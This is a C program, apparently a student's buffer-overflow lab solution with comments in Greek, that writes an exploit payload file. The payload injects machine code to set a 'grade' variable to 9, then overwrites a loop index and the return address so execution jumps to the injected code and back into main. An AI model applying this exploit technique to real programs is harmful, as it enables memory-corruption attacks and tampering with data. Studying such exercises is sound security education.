#include<stdio.h>

int main(){
	int  i=0;
    FILE *fp;
    fp = fopen("createdata9.txt", "w+");
    fprintf(fp,"theodoros chalkidis"); /*to onoma mou 19 grammata*/
    fputc('\0',fp);
	
    fputc('\xc6',fp);   /*machine code for movb*/
    fputc('\x05',fp);

    fputc('\xe8',fp);   /*0x80d46e8 = &grade*/
    fputc('\x46',fp);
    fputc('\x0d',fp);
    fputc('\x08',fp);

    fputc('\x39',fp);   /*ascii timh tou 9 se hex*/

    fputc('\xb8',fp);   /*mov*/
    
    fputc('\x5c',fp);   /*to return mu to kanw 0x8048b5c*/
    fputc('\x8b',fp);   /*pou einai akribws ekei pu prepei*/
    fputc('\x04',fp);   /*stin main pou na sinexizei kanonika*/
    fputc('\x08',fp);   /*to programma*/

    fputc('\xff',fp);   /*jump opcode*/
    fputc('\xe0',fp);
    
    for ( i=0; i<14; i++ ){ /*gemizw ton buf mexri na ftasw sto i */
		fputc(0,fp);
	}

    fputc(56,fp);     /*kanw to i 56 wste na midenisei to return address*/

    fputc('\xf4',fp);   /*grafw panw sto return adress auto pu thelw*/
    fputc('\x65',fp);   /*name + 20 einai o stoxos opou tha trexei to programma mou*/
    fputc('\x0d',fp);   /*0x80d65e0 einai to name + 20 = 0x80d65f4*/
    fputc('\x08',fp);

    fputc('\xe0',fp);   /* ksanagrafw tin dieuthinsi to s (bss) gia na min */
    fputc('\x65',fp);   /* tin katastrepsw */
    fputc('\x0d',fp);
    fputc('\x08',fp);
   
    fclose(fp);
	return 0;

}